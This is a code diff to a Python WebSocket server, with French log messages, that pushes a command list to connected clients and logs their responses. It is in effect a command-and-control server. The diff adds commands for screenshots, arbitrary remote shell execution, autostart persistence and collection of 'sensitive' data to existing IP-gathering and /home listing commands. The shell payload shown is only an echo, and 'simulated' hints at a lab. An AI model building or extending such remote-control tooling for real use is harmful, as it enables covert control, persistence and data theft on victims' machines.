@@ -10,7 +10,7 @@ from common import verify_hmac, json_safe_loads
 
 HOST = "0.0.0.0"
 PORT = 8765
-WORKERS = 2  # nombre de processus à modifier si plus voulus 
+WORKERS = 2 # nombre de processus à modifier si plus voulus 
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
 logger = logging.getLogger("mpserver")
@@ -20,7 +20,11 @@ COMMANDS = [
     {"id": 2, "cmd": "get_ips"},
     {"id": 3, "cmd": "list", "args": {"path": "/home", "max_depth": 1}},
     {"id": 4, "cmd": "uptime"},
-    {"id": 0, "cmd": "bye"}
+    {"id": 5, "cmd": "screenshot"},
+    {"id": 6, "cmd": "run_shell", "args": {"command": "echo hello from server"}},
+    {"id": 7, "cmd": "setup_autostart"},
+    {"id": 8, "cmd": "get_simulated_sensitive"},
+    {"id": 0, "cmd": "bye"},
 ]
 
 async def handle_client(ws, path):
@@ -52,14 +56,15 @@ async def handle_client(ws, path):
             await ws.send(json.dumps(cmd))
             logger.info("[%s] Envoyé cmd %s -> %s", current_process().name, cmd["id"], cmd["cmd"])
             try:
-                resp_raw = await asyncio.wait_for(ws.recv(), timeout=10)
+                resp_raw = await asyncio.wait_for(ws.recv(), timeout=15)
             except asyncio.TimeoutError:
                 logger.warning("[%s] Timeout réponse %s", current_process().name, cmd["cmd"])
                 continue
             resp = json_safe_loads(resp_raw)
             if not resp:
                 continue
-            out_preview = (str(resp.get("output"))[:200] + "...") if len(str(resp.get("output"))) > 200 else str(resp.get("output"))
+            out = str(resp.get("output"))
+            out_preview = (out[:200] + "...") if len(out) > 200 else out
             logger.info("[%s] Réponse %s id=%s status=%s output=%s",
                         current_process().name, peer, resp.get("id"), resp.get("status"), out_preview)
         logger.info("[%s] Session terminée pour %s", current_process().name, peer)
